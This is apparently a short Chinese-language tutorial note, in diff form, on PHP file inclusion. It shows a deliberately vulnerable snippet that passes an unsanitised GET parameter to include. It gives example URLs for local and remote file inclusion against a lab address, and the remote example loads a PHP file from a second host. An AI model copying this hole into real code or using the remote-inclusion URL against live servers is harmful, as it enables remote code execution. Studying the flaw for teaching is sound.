@@ -1,0 +1,14 @@
+hao.php文件中有文件包含函数
+例如：
+<?php
+if(isset($_GET['file'])){
+    $file=$_GET['file'];
+    include $file;
+}
+?>
+include 文件包含函数
+
+本地文件包含调用实例
+命令：http://172.16.16.23:8080/hao.php?file=test2.php     test2.php是本地存在的一个文件
+远程文件包含实例调用：
+命令：http://172.16.16.23:8080/hao.php?file=http://172.16.16.102:8080/test.php   test.php是远程地址中的文件 远程调用需要开始调用端开启php的allow_url_fopne=On,allow_url_inclide=On
